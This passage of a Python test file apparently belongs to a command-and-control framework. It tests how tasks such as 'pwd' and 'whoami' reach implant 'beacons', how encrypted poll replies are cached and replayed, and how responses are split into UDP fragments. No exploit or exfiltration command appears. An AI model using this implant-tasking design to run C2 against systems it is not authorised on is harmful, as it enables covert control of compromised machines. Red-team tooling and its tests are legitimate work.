    stored = runtime.store.read_json(f"tasks/{task['id']}/task.json")
    assert stored["delivery_count"] == 2

    ack = runtime.tasks.ack_tasks(beacon_id, [task["id"]])
    assert ack["count"] == 1
    assert task["id"] not in runtime.tasks._leases
    assert runtime.tasks.claim_tasks(beacon_id, limit=1) == []


def test_poll_request_cache_returns_same_task_batch(client):
    runtime = client.app.state.runtime
    token = "cache-token"
    key = derive_key("cache-secret")
    beacon_id = "cachebeacon"
    runtime.active_payloads[token] = {
        "id": "pl_cache_test",
        "token": token,
        "beacon_id": beacon_id,
        "key_b64": base64.b64encode(key).decode(),
        "replay_protection": False,
        "protocol": "udp",
    }
    runtime.store.write_json(f"beacons/{beacon_id}/beacon.json", {
        "id": beacon_id, "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    runtime.tasks.create_task(beacon_id, plugin="pwd", args={})
    runtime.tasks.create_task(beacon_id, plugin="whoami", args={})
    inner = {
        "kind": "poll",
        "request_id": "req-cache-test",
        "protocol": "udp",
        "beacon": {"id": beacon_id, "hostname": "cache", "platform": "linux", "username": "test"},
        "results": [],
        "task_ack": [],
        "heartbeat": {"current": 2, "fast_interval": 2, "slow_interval": 15},
    }
    sealed = seal(key, __import__("json").dumps(inner).encode(), b"pyexec2-implant")
    request = {"payload_token": token, "data": base64.b64encode(sealed).decode()}
    first = runtime.transport_poll(request)
    second = runtime.transport_poll(request)
    assert first == second
    import json
    first_inner = json.loads(open_seal(key, base64.b64decode(first["data"]), b"pyexec2-server"))
    second_inner = json.loads(open_seal(key, base64.b64decode(second["data"]), b"pyexec2-server"))
    assert first_inner["request_id"] == "req-cache-test"
    assert [item["task_id"] for item in first_inner["tasks"]] == [item["task_id"] for item in second_inner["tasks"]]
    assert len(first_inner["tasks"]) == 2


def test_udp_fragment_packets_fit_mtu_and_roundtrip():
    import json
    import zlib
    from transport_plugins.udp import _fragment_payload
    raw = ("payload-" * 400).encode()
    packets = _fragment_payload(raw, "resp", "mid-test")
    assert all(len(packet) <= 1200 for packet in packets)
    chunks = {}
    for packet in packets:
        item = json.loads(packet)
        chunk = base64.b64decode(item["d"])
        assert item["c"] == f"{zlib.crc32(chunk) & 0xffffffff:08x}"
        chunks[item["i"]] = chunk
    assert b"".join(chunks[i] for i in range(len(chunks))) == raw
